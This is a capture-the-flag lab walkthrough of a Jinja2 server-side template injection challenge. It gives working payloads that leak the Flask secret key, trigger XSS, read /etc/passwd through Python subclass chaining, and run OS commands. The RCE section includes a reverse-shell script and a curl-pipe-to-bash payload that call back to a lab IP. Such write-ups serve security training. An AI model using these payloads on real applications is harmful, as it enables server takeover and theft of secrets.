---
date: 2025-02-12
categories: [CTF, IML]
title: "IML - Halloween 2020: Ep.5 – JinjaBread Man (SSTI)"
tags: ['privilege escalation', 'python', 'rce', 'xss']

description: "Halloween 2020 Ep.5 – JinjaBread - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - Halloween 2020: Ep.5 – JinjaBread Man (SSTI)

This lab is exploiting a Server Side Template Injection (SSTI) vulnerability in Jinja

- Port 80 is open and we have a /admin directory:

![image1](../resources/466353f0bd5a4357ae428959e10f695c.png)

- The actual page seems static apart from the search box:

![image2](../resources/b2bd35e1ca654339aebb2a1b9eca994e.png)

![image3](../resources/e07ac994b43c4f12ae8c87a4796ad570.png)

- Since this is a SSTI box - we can assume the search box is vulnerable

- Great blog for SSTI on Jinja2:  
[https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/)

- We enter

{% raw %}
    {{4*4}}[[5*5]] 
{% endraw %}

and it gets executed (only what's in the `{{ }}` field):

![image4](../resources/3d753f2b10484a048c7a37457164f611.png)

- By injecting 

{% raw %}
```text
{{config.items()}}
```
{% endraw %}

we can get the secret_key

![image5](../resources/bfcc79eacdef409ba6854d6458adfed1.png)

- We can also get XSS by using the safe command:

![image6](../resources/d34a7e1f00624d038d2c249eb62d42c1.png)

{% raw %}
```text
{{'<script>alert(1);</script>'|safe}}
```
{% endraw %}

![image7](../resources/b094f0aca0544fdd934b04bee5cf6f41.png)

**<u>The actual SSTI:</u>**

- First we need to find the index of **_io._IOBase** (the index changes by environment):

{% raw %}
```text
{{'abc'.__class__.__base__.__subclasses__()}}
```
{% endraw %}

![image8](../resources/2fac61fc3fc542c5b30d5de410ece449.png)

- Now we can call it to test - by appending the index **[92]**:

{% raw %}
```text
{{'abc'.__class__.__base__.__subclasses__()[92]}}
```
{% endraw %}

![image9](../resources/c4c0bbd1f35e4621bbd464b77841c108.png)

- We then call the **_io._RawIOBase** class by adding .__subclasses__()[0]:

{% raw %}
```text
{{'abc'.__class__.__base__.__subclasses__()[92].__subclasses__()[0]}}
```
{% endraw %}

![image10](../resources/838a41a738a047d9b5911da4d1c67001.png)

- We then call the **_io.FileIO** class by adding another .__subclasses__()[0]:

{% raw %}
```text
{{'abc'.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]}}
```
{% endraw %}

![image11](../resources/d7680c65ee17404882ba6a257d01c45f.png)

- Finally, we can use this class to construct a file object and read our file:

{% raw %}
```text
{{'abc'.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('/etc/passwd').read()}}
```
{% endraw %}

![image12](../resources/4ed233e49a8d41ebaad6ef45702a3393.png)

**<u>SSTI RCE:</u>**

- The above link shows the RCE but this is a good article as well:  
<https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/>

This RCE happens because **Flask/Jinja2 templates** have the **request object available to them**

- By using the following payload, we are basically doing **import os and os.popen('id')**:

{% raw %}
```text
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
{% endraw %}

![image13](../resources/5d766dd35b294d16a27f9afb8ceeb5e8.png)

- Create a bash script (rev.sh):

```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.102.4.249/4444 0>&1"
```

- Set up a simple python server in the same directory

- Set up a nc listener

- Run the following in the search box:

{% raw %}
```text
{{request.application.__globals__.__builtins__.__import__('os').popen('curl 10.102.4.249:8000/rev.sh | bash').read()}}
```
{% endraw %}

- And we have a shell back:

![image14](../resources/17b9c43fb44944b5bf31cc3d7792b56a.png)

![image15](../resources/e3b3b45085c9487f97b30aa2ead57dfe.png)
